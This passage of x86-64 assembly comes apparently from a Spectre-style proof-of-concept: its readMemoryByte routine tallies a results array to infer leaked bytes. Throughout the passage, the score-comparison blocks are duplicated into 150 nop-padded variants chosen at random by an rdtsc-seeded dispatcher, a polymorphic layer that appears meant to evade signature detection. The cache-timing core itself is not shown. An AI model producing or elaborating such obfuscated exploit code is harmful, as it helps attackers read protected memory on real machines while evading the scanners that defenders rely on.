.LreadMemoryByte_win1_var116:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	nop
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 117
.LreadMemoryByte_win1_var117:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
	nop
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 118
.LreadMemoryByte_win1_var118:
	popq	%rax
	cmpl	$0, -64(%rbp)
	nop
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 119
.LreadMemoryByte_win1_var119:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
	nop
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	nop
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 120
.LreadMemoryByte_win1_var120:
	popq	%rax
	nop
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
	nop
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 121
.LreadMemoryByte_win1_var121:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	nop
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 122
.LreadMemoryByte_win1_var122:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 123
.LreadMemoryByte_win1_var123:
	popq	%rax
	cmpl	$0, -64(%rbp)
	nop
	jl	LBB1_32
	nop
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	nop
	jmp	.LreadMemoryByte_win1_continue
## Variant 124
.LreadMemoryByte_win1_var124:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 125
.LreadMemoryByte_win1_var125:
	popq	%rax
	nop
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 126
.LreadMemoryByte_win1_var126:
	popq	%rax
	nop
	cmpl	$0, -64(%rbp)
	nop
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 127
.LreadMemoryByte_win1_var127:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	nop
	movslq	-64(%rbp), %rdx
	nop
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 128
.LreadMemoryByte_win1_var128:
	popq	%rax
	nop
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	nop
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 129
.LreadMemoryByte_win1_var129:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	nop
	jmp	.LreadMemoryByte_win1_continue
## Variant 130
.LreadMemoryByte_win1_var130:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	nop
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 131
.LreadMemoryByte_win1_var131:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
	nop
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 132
.LreadMemoryByte_win1_var132:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	nop
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 133
.LreadMemoryByte_win1_var133:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
	nop
	nop
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 134
.LreadMemoryByte_win1_var134:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 135
.LreadMemoryByte_win1_var135:
	popq	%rax
	cmpl	$0, -64(%rbp)
	nop
	nop
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 136
.LreadMemoryByte_win1_var136:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
	nop
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	nop
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 137
.LreadMemoryByte_win1_var137:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	nop
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 138
.LreadMemoryByte_win1_var138:
	popq	%rax
	nop
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	nop
	jmp	.LreadMemoryByte_win1_continue
## Variant 139
.LreadMemoryByte_win1_var139:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 140
.LreadMemoryByte_win1_var140:
	popq	%rax
	cmpl	$0, -64(%rbp)
	nop
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	nop
	jmp	.LreadMemoryByte_win1_continue
## Variant 141
.LreadMemoryByte_win1_var141:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	nop
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 142
.LreadMemoryByte_win1_var142:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	nop
	jmp	.LreadMemoryByte_win1_continue
## Variant 143
.LreadMemoryByte_win1_var143:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
	nop
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 144
.LreadMemoryByte_win1_var144:
	popq	%rax
	cmpl	$0, -64(%rbp)
	nop
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 145
.LreadMemoryByte_win1_var145:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	nop
	jmp	.LreadMemoryByte_win1_continue
## Variant 146
.LreadMemoryByte_win1_var146:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
	nop
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	nop
	jmp	.LreadMemoryByte_win1_continue
## Variant 147
.LreadMemoryByte_win1_var147:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 148
.LreadMemoryByte_win1_var148:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 149
.LreadMemoryByte_win1_var149:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	nop
	jmp	.LreadMemoryByte_win1_continue
.LreadMemoryByte_win1_continue:
	cmpl	(%rcx,%rdx,4), %eax
	jl	LBB1_33
LBB1_32:                                ##   in Loop: Header=BB1_26 Depth=2
	movl	-56(%rbp), %eax
	movl	%eax, -64(%rbp)
LBB1_33:                                ##   in Loop: Header=BB1_26 Depth=2
	jmp	LBB1_34
LBB1_34:                                ##   in Loop: Header=BB1_26 Depth=2
	jmp	LBB1_35
LBB1_35:                                ##   in Loop: Header=BB1_26 Depth=2
	movl	-56(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -56(%rbp)
	jmp	LBB1_26
LBB1_36:                                ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	movl	(%rcx,%rdx,4), %ecx
	shll	%ecx
	addl	$5, %ecx
## Start of variant dynamic selector
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$150, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadMemoryByte_win0_var0
	cmpl	$1, %eax
	je	.LreadMemoryByte_win0_var1
	cmpl	$2, %eax
	je	.LreadMemoryByte_win0_var2
	cmpl	$3, %eax
	je	.LreadMemoryByte_win0_var3
	cmpl	$4, %eax
	je	.LreadMemoryByte_win0_var4
	cmpl	$5, %eax
	je	.LreadMemoryByte_win0_var5
	cmpl	$6, %eax
	je	.LreadMemoryByte_win0_var6
	cmpl	$7, %eax
	je	.LreadMemoryByte_win0_var7
	cmpl	$8, %eax
	je	.LreadMemoryByte_win0_var8
	cmpl	$9, %eax
	je	.LreadMemoryByte_win0_var9
	cmpl	$10, %eax
	je	.LreadMemoryByte_win0_var10
	cmpl	$11, %eax
	je	.LreadMemoryByte_win0_var11
	cmpl	$12, %eax
	je	.LreadMemoryByte_win0_var12
	cmpl	$13, %eax
	je	.LreadMemoryByte_win0_var13
	cmpl	$14, %eax
	je	.LreadMemoryByte_win0_var14
	cmpl	$15, %eax
	je	.LreadMemoryByte_win0_var15
	cmpl	$16, %eax
	je	.LreadMemoryByte_win0_var16
	cmpl	$17, %eax
	je	.LreadMemoryByte_win0_var17
	cmpl	$18, %eax
	je	.LreadMemoryByte_win0_var18
	cmpl	$19, %eax
	je	.LreadMemoryByte_win0_var19
	cmpl	$20, %eax
	je	.LreadMemoryByte_win0_var20
	cmpl	$21, %eax
	je	.LreadMemoryByte_win0_var21
	cmpl	$22, %eax
	je	.LreadMemoryByte_win0_var22
	cmpl	$23, %eax
	je	.LreadMemoryByte_win0_var23
	cmpl	$24, %eax
	je	.LreadMemoryByte_win0_var24
	cmpl	$25, %eax
	je	.LreadMemoryByte_win0_var25
	cmpl	$26, %eax
	je	.LreadMemoryByte_win0_var26
	cmpl	$27, %eax
	je	.LreadMemoryByte_win0_var27
	cmpl	$28, %eax
	je	.LreadMemoryByte_win0_var28
	cmpl	$29, %eax
	je	.LreadMemoryByte_win0_var29
	cmpl	$30, %eax
	je	.LreadMemoryByte_win0_var30
	cmpl	$31, %eax
	je	.LreadMemoryByte_win0_var31
	cmpl	$32, %eax
	je	.LreadMemoryByte_win0_var32
	cmpl	$33, %eax
	je	.LreadMemoryByte_win0_var33
	cmpl	$34, %eax
	je	.LreadMemoryByte_win0_var34
	cmpl	$35, %eax
	je	.LreadMemoryByte_win0_var35
	cmpl	$36, %eax
	je	.LreadMemoryByte_win0_var36
	cmpl	$37, %eax
	je	.LreadMemoryByte_win0_var37
	cmpl	$38, %eax
	je	.LreadMemoryByte_win0_var38
	cmpl	$39, %eax
	je	.LreadMemoryByte_win0_var39
	cmpl	$40, %eax
	je	.LreadMemoryByte_win0_var40
	cmpl	$41, %eax
	je	.LreadMemoryByte_win0_var41
	cmpl	$42, %eax
	je	.LreadMemoryByte_win0_var42
	cmpl	$43, %eax
	je	.LreadMemoryByte_win0_var43
	cmpl	$44, %eax
	je	.LreadMemoryByte_win0_var44
	cmpl	$45, %eax
	je	.LreadMemoryByte_win0_var45
	cmpl	$46, %eax
	je	.LreadMemoryByte_win0_var46
	cmpl	$47, %eax
	je	.LreadMemoryByte_win0_var47
	cmpl	$48, %eax
	je	.LreadMemoryByte_win0_var48
	cmpl	$49, %eax
	je	.LreadMemoryByte_win0_var49
	cmpl	$50, %eax
	je	.LreadMemoryByte_win0_var50
	cmpl	$51, %eax
	je	.LreadMemoryByte_win0_var51
	cmpl	$52, %eax
	je	.LreadMemoryByte_win0_var52
	cmpl	$53, %eax
	je	.LreadMemoryByte_win0_var53
	cmpl	$54, %eax
	je	.LreadMemoryByte_win0_var54
	cmpl	$55, %eax
	je	.LreadMemoryByte_win0_var55
	cmpl	$56, %eax
	je	.LreadMemoryByte_win0_var56
	cmpl	$57, %eax
	je	.LreadMemoryByte_win0_var57
	cmpl	$58, %eax
	je	.LreadMemoryByte_win0_var58
	cmpl	$59, %eax
	je	.LreadMemoryByte_win0_var59
	cmpl	$60, %eax
	je	.LreadMemoryByte_win0_var60
	cmpl	$61, %eax
	je	.LreadMemoryByte_win0_var61
	cmpl	$62, %eax
	je	.LreadMemoryByte_win0_var62
	cmpl	$63, %eax
	je	.LreadMemoryByte_win0_var63
	cmpl	$64, %eax
	je	.LreadMemoryByte_win0_var64
	cmpl	$65, %eax
	je	.LreadMemoryByte_win0_var65
	cmpl	$66, %eax
	je	.LreadMemoryByte_win0_var66
	cmpl	$67, %eax
	je	.LreadMemoryByte_win0_var67
	cmpl	$68, %eax
	je	.LreadMemoryByte_win0_var68
	cmpl	$69, %eax
	je	.LreadMemoryByte_win0_var69
	cmpl	$70, %eax
	je	.LreadMemoryByte_win0_var70
	cmpl	$71, %eax
	je	.LreadMemoryByte_win0_var71
	cmpl	$72, %eax
	je	.LreadMemoryByte_win0_var72
	cmpl	$73, %eax
	je	.LreadMemoryByte_win0_var73
	cmpl	$74, %eax
	je	.LreadMemoryByte_win0_var74
	cmpl	$75, %eax
	je	.LreadMemoryByte_win0_var75
	cmpl	$76, %eax
	je	.LreadMemoryByte_win0_var76
	cmpl	$77, %eax
	je	.LreadMemoryByte_win0_var77
	cmpl	$78, %eax
	je	.LreadMemoryByte_win0_var78
	cmpl	$79, %eax
	je	.LreadMemoryByte_win0_var79
	cmpl	$80, %eax
	je	.LreadMemoryByte_win0_var80
	cmpl	$81, %eax
	je	.LreadMemoryByte_win0_var81
	cmpl	$82, %eax
	je	.LreadMemoryByte_win0_var82
	cmpl	$83, %eax
	je	.LreadMemoryByte_win0_var83
	cmpl	$84, %eax
	je	.LreadMemoryByte_win0_var84
	cmpl	$85, %eax
	je	.LreadMemoryByte_win0_var85
	cmpl	$86, %eax
	je	.LreadMemoryByte_win0_var86
	cmpl	$87, %eax
	je	.LreadMemoryByte_win0_var87
	cmpl	$88, %eax
	je	.LreadMemoryByte_win0_var88
	cmpl	$89, %eax
	je	.LreadMemoryByte_win0_var89
	cmpl	$90, %eax
	je	.LreadMemoryByte_win0_var90
	cmpl	$91, %eax
	je	.LreadMemoryByte_win0_var91
	cmpl	$92, %eax
	je	.LreadMemoryByte_win0_var92
	cmpl	$93, %eax
	je	.LreadMemoryByte_win0_var93
	cmpl	$94, %eax
	je	.LreadMemoryByte_win0_var94
	cmpl	$95, %eax
	je	.LreadMemoryByte_win0_var95
	cmpl	$96, %eax
	je	.LreadMemoryByte_win0_var96
	cmpl	$97, %eax
	je	.LreadMemoryByte_win0_var97
	cmpl	$98, %eax
	je	.LreadMemoryByte_win0_var98
	cmpl	$99, %eax
	je	.LreadMemoryByte_win0_var99
	cmpl	$100, %eax
	je	.LreadMemoryByte_win0_var100
	cmpl	$101, %eax
	je	.LreadMemoryByte_win0_var101
	cmpl	$102, %eax
	je	.LreadMemoryByte_win0_var102
	cmpl	$103, %eax
	je	.LreadMemoryByte_win0_var103
	cmpl	$104, %eax
	je	.LreadMemoryByte_win0_var104
	cmpl	$105, %eax
	je	.LreadMemoryByte_win0_var105
	cmpl	$106, %eax
	je	.LreadMemoryByte_win0_var106
	cmpl	$107, %eax
	je	.LreadMemoryByte_win0_var107
	cmpl	$108, %eax
	je	.LreadMemoryByte_win0_var108
	cmpl	$109, %eax
	je	.LreadMemoryByte_win0_var109
	cmpl	$110, %eax
	je	.LreadMemoryByte_win0_var110
	cmpl	$111, %eax
	je	.LreadMemoryByte_win0_var111
	cmpl	$112, %eax
	je	.LreadMemoryByte_win0_var112
	cmpl	$113, %eax
	je	.LreadMemoryByte_win0_var113
	cmpl	$114, %eax
	je	.LreadMemoryByte_win0_var114
	cmpl	$115, %eax
	je	.LreadMemoryByte_win0_var115
	cmpl	$116, %eax
	je	.LreadMemoryByte_win0_var116
	cmpl	$117, %eax
	je	.LreadMemoryByte_win0_var117
	cmpl	$118, %eax
	je	.LreadMemoryByte_win0_var118
	cmpl	$119, %eax
	je	.LreadMemoryByte_win0_var119
	cmpl	$120, %eax
	je	.LreadMemoryByte_win0_var120
	cmpl	$121, %eax
	je	.LreadMemoryByte_win0_var121
	cmpl	$122, %eax
	je	.LreadMemoryByte_win0_var122
	cmpl	$123, %eax
	je	.LreadMemoryByte_win0_var123
	cmpl	$124, %eax
	je	.LreadMemoryByte_win0_var124
	cmpl	$125, %eax
	je	.LreadMemoryByte_win0_var125
	cmpl	$126, %eax
	je	.LreadMemoryByte_win0_var126
	cmpl	$127, %eax
	je	.LreadMemoryByte_win0_var127
	cmpl	$128, %eax
	je	.LreadMemoryByte_win0_var128
	cmpl	$129, %eax
	je	.LreadMemoryByte_win0_var129
	cmpl	$130, %eax
	je	.LreadMemoryByte_win0_var130
	cmpl	$131, %eax
	je	.LreadMemoryByte_win0_var131
	cmpl	$132, %eax
	je	.LreadMemoryByte_win0_var132
	cmpl	$133, %eax
	je	.LreadMemoryByte_win0_var133
	cmpl	$134, %eax
	je	.LreadMemoryByte_win0_var134
	cmpl	$135, %eax
	je	.LreadMemoryByte_win0_var135
	cmpl	$136, %eax
	je	.LreadMemoryByte_win0_var136
	cmpl	$137, %eax
	je	.LreadMemoryByte_win0_var137
	cmpl	$138, %eax
	je	.LreadMemoryByte_win0_var138
	cmpl	$139, %eax
	je	.LreadMemoryByte_win0_var139
	cmpl	$140, %eax
	je	.LreadMemoryByte_win0_var140
	cmpl	$141, %eax
	je	.LreadMemoryByte_win0_var141
	cmpl	$142, %eax
	je	.LreadMemoryByte_win0_var142
	cmpl	$143, %eax
	je	.LreadMemoryByte_win0_var143
	cmpl	$144, %eax
	je	.LreadMemoryByte_win0_var144
	cmpl	$145, %eax
	je	.LreadMemoryByte_win0_var145
	cmpl	$146, %eax
	je	.LreadMemoryByte_win0_var146
	cmpl	$147, %eax
	je	.LreadMemoryByte_win0_var147
	cmpl	$148, %eax
	je	.LreadMemoryByte_win0_var148
	cmpl	$149, %eax
	je	.LreadMemoryByte_win0_var149
	jmp	.LreadMemoryByte_win0_var0
## Variant 0
.LreadMemoryByte_win0_var0:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 1
.LreadMemoryByte_win0_var1:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	nop
	movslq	-60(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 2
.LreadMemoryByte_win0_var2:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 3
.LreadMemoryByte_win0_var3:
	popq	%rax
	nop
	nop
	nop
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 4
.LreadMemoryByte_win0_var4:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	nop
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 5
.LreadMemoryByte_win0_var5:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
	nop
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 6
.LreadMemoryByte_win0_var6:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 7
.LreadMemoryByte_win0_var7:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
	nop
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	nop
	jmp	.LreadMemoryByte_win0_continue
## Variant 8
.LreadMemoryByte_win0_var8:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	cmpl	$2, (%rax,%rcx,4)
	nop
	jmp	.LreadMemoryByte_win0_continue
## Variant 9
